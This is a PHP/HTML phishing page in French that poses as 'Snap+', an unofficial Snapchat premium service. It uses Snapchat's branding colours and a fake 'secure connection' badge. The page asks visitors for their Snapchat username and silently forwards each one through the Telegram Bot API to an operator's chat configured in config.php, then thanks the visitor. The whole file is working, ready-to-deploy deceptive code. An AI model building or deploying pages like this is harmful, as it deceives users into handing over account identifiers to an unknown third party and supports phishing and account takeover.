<?php

declare(strict_types=1);

$config = require __DIR__ . '/config.php';
$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pseudo = isset($_POST['pseudo']) ? trim((string) $_POST['pseudo']) : '';

    if ($pseudo === '') {
        $error = 'Veuillez entrer votre nom d\'utilisateur Snapchat.';
    } else {
        $token = (string) ($config['telegram_bot_token'] ?? '');
        $chatId = (string) ($config['telegram_chat_id'] ?? '');

        if ($token === '' || $token === 'VOTRE_BOT_TOKEN' || $chatId === '' || $chatId === 'VOTRE_CHAT_ID') {
            $error = 'Configuration Telegram incomplète : renseignez le token et le chat ID dans config.php.';
        } else {
            $text = 'Nouveau pseudo Snapchat : ' . $pseudo;
            $url = 'https://api.telegram.org/bot' . rawurlencode($token) . '/sendMessage';

            $payload = http_build_query([
                'chat_id' => $chatId,
                'text' => $text,
                'parse_mode' => 'HTML',
            ], '', '&', PHP_QUERY_RFC3986);

            $ch = curl_init($url);
            if ($ch === false) {
                $error = 'Impossible d\'initialiser la connexion.';
            } else {
                curl_setopt_array($ch, [
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $payload,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
                    CURLOPT_TIMEOUT => 15,
                ]);
                $response = curl_exec($ch);
                $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                if ($response === false) {
                    $error = 'Erreur réseau lors de l\'envoi.';
                } else {
                    $data = json_decode($response, true);
                    if ($httpCode === 200 && is_array($data) && ($data['ok'] ?? false) === true) {
                        $message = 'Merci ! Votre demande a bien été enregistrée.';
                    } else {
                        $desc = is_array($data) ? ($data['description'] ?? '') : '';
                        $error = $desc !== '' ? htmlspecialchars($desc, ENT_QUOTES, 'UTF-8') : 'L\'envoi vers Telegram a échoué. Vérifiez le token et le chat ID.';
                    }
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snap+</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #FFFC00;
            padding: 1.5rem;
        }
        .card {
            width: 100%;
            max-width: 380px;
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
            padding: 2rem 1.75rem 1.75rem;
            text-align: center;
        }
        .logo-wrap {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 56px;
            height: 56px;
            background: #FFFC00;
            border-radius: 14px;
            margin-bottom: 0.75rem;
        }
        .logo-wrap svg { width: 36px; height: 36px; }
        .badge {
            display: inline-block;
            background: #000;
            color: #FFFC00;
            font-size: 0.7rem;
            font-weight: 700;
            letter-spacing: 0.06em;
            padding: 0.35rem 0.75rem;
            border-radius: 999px;
            margin-bottom: 1.25rem;
        }
        .intro {
            color: #666;
            font-size: 0.95rem;
            line-height: 1.5;
            margin: 0 0 1.5rem;
        }
        form { text-align: left; }
        label { display: block; margin-bottom: 0.4rem; font-size: 0.85rem; color: #333; }
        input[type="text"] {
            width: 100%;
            padding: 0.85rem 1rem;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 1rem;
            margin-bottom: 1rem;
        }
        input[type="text"]::placeholder { color: #aaa; }
        input[type="text"]:focus {
            outline: none;
            border-color: #ccc;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.35);
        }
        button[type="submit"] {
            width: 100%;
            padding: 0.95rem;
            border: none;
            border-radius: 12px;
            background: #FFFC00;
            color: #000;
            font-weight: 700;
            font-size: 0.95rem;
            letter-spacing: 0.04em;
            cursor: pointer;
        }
        button[type="submit"]:hover { filter: brightness(0.97); }
        .footer-secure {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.35rem;
            margin-top: 1.25rem;
            font-size: 0.8rem;
            color: #888;
        }
        .footer-secure svg { flex-shrink: 0; }
        .alert {
            border-radius: 10px;
            padding: 0.65rem 0.85rem;
            margin-bottom: 1rem;
            font-size: 0.9rem;
            text-align: center;
        }
        .alert-error { background: #ffe8e8; color: #b00020; }
        .alert-success { background: #e8f5e9; color: #1b5e20; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-wrap" aria-hidden="true">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path fill="#fff" stroke="#000" stroke-width="3" d="M50 8 C28 8 12 28 12 48 c0 8 3 16 8 22 C12 78 8 88 8 92 h84 c0-4-4-14-12-22 5-6 8-14 8-22 C88 28 72 8 50 8z M38 58 c4 6 10 10 12 10 s8-4 12-10"/>
            </svg>
        </div>
        <div class="badge">SNAP+</div>
        <p class="intro">Bienvenue sur Snap+ ! Profitez d'avantages exclusifs et de fonctionnalités premium pour votre compte Snapchat.</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>
        <?php if ($message !== '') : ?>
            <div class="alert alert-success" role="status"><?= htmlspecialchars($message, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>

        <form method="post" action="">
            <label for="pseudo">Nom d'utilisateur</label>
            <input
                type="text"
                id="pseudo"
                name="pseudo"
                placeholder="Nom d'utilisateur Snapchat"
                value="<?= isset($_POST['pseudo']) ? htmlspecialchars((string) $_POST['pseudo'], ENT_QUOTES, 'UTF-8') : '' ?>"
                autocomplete="username"
                maxlength="64"
            >
            <button type="submit">CONTINUER</button>
        </form>

        <div class="footer-secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#FF9800" aria-hidden="true">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Connexion sécurisée</span>
        </div>
    </div>
</body>
</html>
